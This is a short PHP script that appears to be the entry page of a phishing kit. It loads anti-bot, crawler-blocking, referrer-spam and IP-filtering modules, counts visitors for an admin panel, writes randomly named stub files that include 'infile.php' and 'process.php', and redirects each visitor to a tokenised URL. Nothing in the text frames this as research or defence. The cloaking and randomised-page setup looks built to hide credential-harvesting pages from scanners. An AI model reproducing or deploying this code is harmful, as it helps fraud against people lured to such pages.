<?php
session_start();
error_reporting(0);
include 'autob/bt.php';
include 'autob/basicbot.php';
include 'autob/uacrawler.php';
include 'autob/refspam.php';
include 'autob/ipselect.php';
include 'autob/bts2.php';
$ib = $_SERVER['REMOTE_ADDR'];
if(!isset($_SESSION['client'])){updateadmin('clients');$_SESSION['client']=getadmin('clients');};
$random=rand(0,100000);
$ran = md5($random);
$d=dirname($_SERVER['PHP_SELF']);
$redc="<?php include 'infile.php';?>";
$redname=$_SESSION['indexfile'];
if(!file_exists($redname.".php")){
$red = fopen($redname.".php","w");
fwrite($red,$redc);
fclose($red);};
$redc="<?php include 'process.php';?>";
$redname=$_SESSION['processor']=substr(md5($_SERVER['HTTP_HOST'].'yochithegreatloner') ,0, 5);
if(!file_exists($redname.".php")){
$red = fopen($redname.".php","w");
fwrite($red,$redc);
fclose($red);};
echo '<!DOCTYPE html>
<html>
<head>
<script>setTimeout(function(){window.location.href="'.$index.'?'.genv(getadmin('o')[0]).'='.md5(uniqid().$ran).'";});</script>
</head></html>';
?>